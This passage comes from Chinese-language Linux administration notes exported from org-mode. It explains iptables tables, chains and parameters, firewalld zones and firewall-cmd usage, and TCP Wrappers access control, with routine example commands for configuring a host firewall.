
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;input&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;负责过滤所有目标地址是本机地址的数据包，就是过滤进入主机的数据包&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;forward&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;负责转发流经主机但不进入本机的数据包，和NAT关系很大&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;output&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;负责处理源地址的数据包，就是对本机发出的数据包;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre class=&quot;example&quot;&gt;
2. NAT 表，负责网络地址转换，即来源于目的IP地址和端口的转换，一般用于共享上网或特殊端口的转换服务

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 31:&lt;/span&gt; NAT&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;snat&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;地址转换&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;dnat&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;标地址转换&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;pnat&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;标端口转换&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre class=&quot;example&quot;&gt;
3. mangle 表
将报文拆开来并修改报文标志位，最后封装起来

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 5个检查点（内置链）

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;PREROUTING&lt;/li&gt;
&lt;li&gt;INPUT&lt;/li&gt;
&lt;li&gt;FORWORD&lt;/li&gt;
&lt;li&gt;OUTPUT&lt;/li&gt;
&lt;li&gt;POSTROUTING&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
iptables中常用的参数以及作用
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 32:&lt;/span&gt; iptables中常用的参数以及作用&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;参数&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-P&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认策略&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-F&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;清空规则链&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-L&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;查看规则链&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-A&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;在规则链的末尾加入新规则&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-I num&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;在规则链的头部加入新规则&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-D num&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;删除某一条规则&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-s&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配来源地址IP/MASK，加叹号“!”表示除这个IP外&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-d&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配目标地址&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-i 网卡名称&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配从这块网卡流入的数据&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-o 网卡名称&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配从这块网卡流出的数据&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-p&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配协议，如TCP、UDP、ICMP&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;dport num&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配目标端口号&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;sport num&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配来源端口号&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看已有的防火墙规则链
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -L
$ iptables -nvL –line-number
-L 查看当前表的所有规则，默认查看的是filter表，如果要查看NAT表，可以加上-t NAT参数
-n 不对ip地址进行反查，加上这个参数显示速度会快很多
-v 输出详细信息，包含通过该规则的数据包数量，总字节数及相应的网络接口
–line-number 显示规则的序列号，这个参数在删除或修改规则时会用到

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
清空已有的防火墙规则链
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -F

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;添加规则
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
把INPUT规则链的默认策略设置为拒绝
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -P INPUT DROP
规则链的默认策略拒绝动作只能是DROP，而不能是REJECT。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
向INPUT链中添加允许ICMP流量进入的策略规则
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -I INPUT -p icmp -j ACCEPT
在日常运维工作中，经常会使用ping命令来检查对方主机是否在线，而向防火墙的INPUT规则链中添加一条允许ICMP流量进入的策略规则就默认允许了
这种ping命令检测行为。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
删除INPUT规则链中刚刚加入的那条策略（允许ICMP流量），并把默认策略设置为允许
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -D INPUT 1
$ iptables -P INPUT ACCEPT

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
将INPUT规则链设置为只允许指定网段的主机访问本机的22端口，拒绝来自其他所有主机的流量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -I INPUT -s 192.168.10.0/24 -p tcp --dport 22 -j ACCEPT
$ iptables -A INPUT -p tcp --dport 22 -j REJECT

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
向INPUT规则链中添加拒绝所有人访问本机12345端口的策略规则
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -I INPUT -p tcp --dport 12345 -j REJECT
$ iptables -I INPUT -p udp --dport 12345 -j REJECT

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
向INPUT规则链中添加拒绝192.168.10.5主机访问本机80端口（Web服务）的策略规则
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -I INPUT -p tcp -s 192.168.10.5 --dport 80 -j REJECT

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
向INPUT规则链中添加拒绝所有主机访问本机1000～1024端口的策略规则
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ iptables -A INPUT -p tcp --dport 1000:1024 -j REJECT
$ iptables -A INPUT -p udp --dport 1000:1024 -j REJECT

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
保存防火墙策略命令，使其永久生效
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ service iptables save

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Firewalld
&lt;br /&gt;
Firewalld(Dynamic Firewall Manager of Linux systems, Linux系统的动态防火墙管理器)，服务是默认的防火墙配置管理工具，它拥有基于CLI（命令行界面）和基于GUI（图形用户界面）的两种管理方式。
&lt;br /&gt;
相较于传统的防火墙管理配置工具，firewalld支持动态更新技术并加入了区域（zone）的概念。简单来说，区域就是firewalld预先准备了几套防火墙策略集合（策略模板），用户可以根据生产场景的不同而选择合适的策略集合，从而实现防火墙策略之间的快速切换。
&lt;br /&gt;
firewalld中常见的区域名称（默认为public）以及相应的策略规则如下表所示。
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 33:&lt;/span&gt; firewalld中常用的区域名称及策略规则&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;区域&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;默认规则策略&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;trusted&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;允许所有的数据包&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;home&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;internal&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;等同于home区域&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;work&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;public&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;external&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;dmz&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;block&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;drop&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拒绝流入的流量，除非与流出的流量相关&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
终端管理工具
&lt;br /&gt;
firewall-cmd是firewalld防火墙配置管理工具的CLI（命令行界面）版本
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 34:&lt;/span&gt; firewall-cmd命令中使用的参数以及作用&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;参数&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;get-default-zone&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;查询默认的区域名称&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;set-default-zone=&amp;lt;区域名称&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认的区域，使其永久生效&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;get-zones&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示可用的区域&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;get-services&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示预先定义的服务&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;get-active-zones&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示当前正在使用的区域与网卡名称&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;add-source=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;将源自此IP或子网的流量导向指定的区域&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;remove-source=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不再将源自此IP或子网的流量导向某个指定区域&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;add-interface=&amp;lt;网卡名称&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;将源自该网卡的所有流量都导向某个指定区域&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;change-interface=&amp;lt;网卡名称&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;将某个网卡与区域进行关联&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;list-all&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示当前区域的网卡配置参数、资源、端口以及服务等信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;list-all-zones&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示所有区域的网卡配置参数、资源、端口以及服务等信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;add-service=&amp;lt;服务名&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认区域允许该服务的流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;add-port=&amp;lt;端口号/协议&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认区域允许该端口的流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;remove-service=&amp;lt;服务名&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认区域不再允许该服务的流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;remove-port=&amp;lt;端口号/协议&amp;gt;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;设置默认区域不再允许该端口的流量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;reload&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;让“永久生效”的配置规则立即生效，并覆盖当前的配置规则&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;panic-on&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;开启应急状况模式&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2013;panic-off&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;关闭应急状况模式&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
使用firewalld配置的防火墙策略默认为运行时（Runtime）模式，又称为当前生效模式，而且随着系统的重启会失效。如果想让配置策略一直存在，就需要使用永久（Permanent）模式了，方法就是在用firewall-cmd命令正常设置防火墙策略时添加&amp;#x2013;permanent参数，这样配置的防火墙策略就可以永久生效了。但是，永久生效模式有一个“不近人情”的特点，就是使用它设置的策略只有在系统重启之后才能自动生效。如果想让配置的策略立生效，需要手动执行firewall-cmd &amp;#x2013;reload命令。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;使用示例
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看firewalld服务当前所使用的区域
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --get-default-zone

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查询eno16777728网卡在firewalld服务中的区域
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --get-zone-of-interface=eno16777728

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把firewalld服务中eno16777728网卡的默认区域修改为external，并在系统重启后生效。分别查看当前与永久模式下的区域名称
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --permanent --zone=external --change-interface=eno16777728
# firewall-cmd --get-zone-of-interface=eno16777728
# firewall-cmd --permanent --get-zone-of-interface=eno16777728

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把firewalld服务的当前默认区域设置为public
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --set-default-zone=public
# firewall-cmd --get-default-zone

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
启动/关闭firewalld防火墙服务的应急状况模式，阻断一切网络连接（当远程控制服务器时请慎用）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --panic-on
# firewall-cmd --panic-off

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查询public区域是否允许请求SSH和HTTPS协议的流量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --zone=public --query-service=ssh
# firewall-cmd --zone=public --query-service=https

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把firewalld服务中请求HTTPS协议的流量设置为永久允许，并立即生效
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --zone=public --add-service=https
# firewall-cmd --permanent --zone=public --add-service=https
# firewall-cmd --reload

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把firewalld服务中请求HTTP协议的流量设置为永久拒绝，并立即生效：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --permanent --zone=public --remove-service=http
# firewall-cmd --reload 

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把在firewalld服务中访问8080和8081端口的流量策略设置为允许，但仅限当前生效
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --zone=public --add-port=8080-8081/tcp
# firewall-cmd --zone=public --list-ports

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
把原本访问本机888端口的流量转发到22端口，要且求当前和长期均有效
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
流量转发命令格式为:
# firewall-cmd --permanent --zone=&amp;lt;区域&amp;gt; --add-forward-port=port=&amp;lt;源端口号&amp;gt;:proto=&amp;lt;协议&amp;gt;:toport=&amp;lt;目标端口号&amp;gt;:toaddr=&amp;lt;目标IP地址&amp;gt;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
# firewall-cmd --permanent --zone=public --add-forward-port=port=888:proto=tcp:toport=22:toaddr=192.168.10.10
# firewall-cmd --reload

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
firewalld中的富规则表示更细致、更详细的防火墙策略配置，它可以针对系统服务、端口号、源地址和目标地址等诸多信息进行更有针对性的策略配置。它的优先级在所有的防火墙策略中也是最高的。比如，我们可以在firewalld服务中配置一条富规则，使其拒绝192.168.10.0/24网段的所有用户访问本机的ssh服务（22端口）：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo firewall-cmd --permanent --zone=public --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;192.168.10.0/24&quot; service name=&quot;ssh&quot; reject&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;图形化管理工具&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
服务的访问控制列表
&lt;br /&gt;
TCP Wrappers是RHEL 7系统中默认启用的一款流量监控程序，它能够根据来访主机的地址与本机的目标服务程序作出允许或拒绝的操作。换句话说，Linux系统中其实有两个层面的防火墙，第一种是前面讲到的基于TCP/IP协议的流量过滤工具，而TCP Wrappers服务则是能允许或禁止Linux系统提供服务的防火墙，从而在更高层面保护了Linux系统的安全运行。
&lt;br /&gt;
TCP Wrappers服务的防火墙策略由两个控制列表文件所控制。系统将会先检查允许控制列表文件（/etc/hosts.allow），如果匹配到相应的允许策略则放行流量；如果没有匹配，则去进一步匹配拒绝控制列表文件（/etc/hosts.deny），若找到匹配项则拒绝该流量。如果这两个文件全都没有匹配到，则默认放行流量。
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 35:&lt;/span&gt; TCP Wrappers服务的控制列表文件中常用的参数&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;客户端类型&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;示例&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;满足示例的客户端列表&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;单一主机&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;192.168.10.10&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;IP地址为192.168.10.10的主机&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;指定网段&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;192.168.10.&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;IP段为192.168.10.0/24的主机&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;指定网段&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;192.168.10.0/255.255.255.0&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;IP段为192.168.10.0/24的主机&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;指定DNS后缀&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;.linuxprobe.com&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;所有DNS后缀为.linuxprobe.com的主机&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;指定主机名称&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;www.linuxprobe.com&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;主机名称为www.linuxprobe.com的主机&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;指定所有客户端&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;ALL&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;所有主机全部包括在内&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
在配置TCP Wrappers服务时需要遵循两个原则：
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;编写拒绝策略规则时，填写的是服务名称，而非协议名称；&lt;/li&gt;
&lt;li&gt;建议先编写拒绝策略规则，再编写允许策略规则，以便直观地看到相应的效果。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;参考资料
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Iptables&quot;&gt;iptables wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://baike.baidu.com/item/IPTABLES/9139339?fr=aladdin&quot;&gt;iptables 百度百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.debian.org/iptables&quot;&gt;iptables debian wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org69d76be&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org69d76be&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.5&lt;/span&gt; Linux Logs&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org290643f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org290643f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.6&lt;/span&gt; Linux Start&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga335a47&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga335a47&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.7&lt;/span&gt; Linux Backup and Restore&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org25711e9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org25711e9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.8&lt;/span&gt; Linux Software&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-8&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org38813df&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org38813df&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.1&lt;/span&gt; 在服务器上启用HTTPS&lt;/h4&gt;
